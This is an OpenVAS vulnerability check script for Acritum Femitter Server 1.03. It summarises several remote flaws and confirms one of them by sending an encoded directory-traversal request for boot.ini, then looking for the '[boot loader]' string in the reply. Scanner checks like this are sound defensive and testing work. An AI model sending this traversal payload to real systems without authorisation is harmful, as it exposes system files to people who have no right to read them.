###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_Femitter_39868.nasl 5306 2017-02-16 09:00:16Z teissa $
#
# Acritum Femitter Server 1.03 Multiple Remote Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Acritum Femitter Server is prone to multiple remote vulnerabilities,
including:

- An authentication-bypass vulnerability
- An arbitrary file-download vulnerability
- A directory-traversal vulnerability
- An arbitrary file-upload vulnerability

Exploiting this issue will allow an attacker to gain access to
sensitive information, upload arbitrary files, download arbitrary
files, and execute arbitrary code within context of the affected
server. Other attacks are also possible.

Acritum Femitter Server 1.03 is vulnerable; other versions may also
be affected.";


if (description)
{
 script_id(100619);
 script_version("$Revision: 5306 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-16 10:00:16 +0100 (Thu, 16 Feb 2017) $");
 script_tag(name:"creation_date", value:"2010-05-04 12:32:13 +0200 (Tue, 04 May 2010)");
 script_bugtraq_id(39868);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_name("Acritum Femitter Server 1.03 Multiple Remote Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/39868");
 script_xref(name : "URL" , value : "http://www.acritum.com/fem/index.htm");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web Servers");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

url = string("/%5C%5C..%2f..%2f..%2f..%2fboot.ini%%20../");

if(http_vuln_check(port:port, url:url,pattern:"\[boot loader\]")) {
  security_message(port:port);
  exit(0);
}  

exit(0);
